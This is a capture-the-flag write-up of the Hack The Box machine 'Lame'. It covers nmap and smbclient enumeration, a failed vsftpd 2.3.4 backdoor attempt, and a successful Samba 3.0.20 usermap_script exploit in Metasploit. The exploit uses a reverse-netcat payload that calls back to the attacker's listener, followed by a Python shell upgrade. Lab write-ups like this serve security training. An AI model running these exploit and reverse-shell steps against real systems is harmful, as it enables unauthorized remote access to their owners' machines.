# HTB - Lame

IP: 10.10.10.3  
Difficulty: Easy  
Tags: FTP, Samba, Reverse Shell

---

## Nmap Scan & Service Enumeration

Started with a basic nmap scan:

```bash
nmap 10.10.10.3
```

Then checked the version of the FTP service:

```bash
nmap -sV -p 21 10.10.10.3
```

Found: `vsftpd 2.3.4`, which is a known vulnerable version.

---

## Trying vsftpd 2.3.4 Exploit

I used Metasploit to attempt the exploit:

```bash
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 10.10.10.3
run
```

Unfortunately, this didn't result in a shell. So I moved on to checking SMB.

---

## SMB Version Check

Scanned the SMB ports:

```bash
nmap -sV -p 139,445 10.10.10.3
```

The version wasn't clear, so I used smbclient:

```bash
smbclient -L 10.10.10.3 -N
```

This revealed that the target is running **Samba 3.0.20**, which is vulnerable to the `usermap_script` exploit.

---

## Exploiting Samba 3.0.20

Back to Metasploit:

```bash
msfconsole
use exploit/multi/samba/usermap_script
set RHOSTS 10.10.10.3
set RPORT 139
set LHOST 10.10.14.106     # replace with your tun0 IP
set LPORT 4444
set PAYLOAD cmd/unix/reverse_netcat
run
```

Before running the above, I started a Netcat listener in another terminal:

```bash
nc -lvnp 4444
```

After executing the exploit, Metasploit didn’t show a session, but my Netcat listener caught a shell:

```
[*] Command shell session 1 opened
```

---

## Upgrading the Shell (Optional)

To get a more usable shell:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

If Python 2 isn't available:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## Summary Table

| Service | Port | Version     | Exploit Module                             | Result     |
|---------|------|-------------|--------------------------------------------|------------|
| FTP     | 21   | vsftpd 2.3.4| exploit/unix/ftp/vsftpd_234_backdoor       | ❌ Failed  |
| SMB     | 139  | Samba 3.0.20| exploit/multi/samba/usermap_script         | ✅ Success |

---

## Final Notes

- The FTP backdoor exploit didn’t work, but it was worth a try.
- smbclient was helpful for identifying the vulnerable Samba version.
- Listener is important — Metasploit may not show an open session.
- Upgrading to a proper shell using Python makes interaction easier.


Author: Srikanth A  
Platform: Hack The Box  
Machine: Lame  
Level: Easy

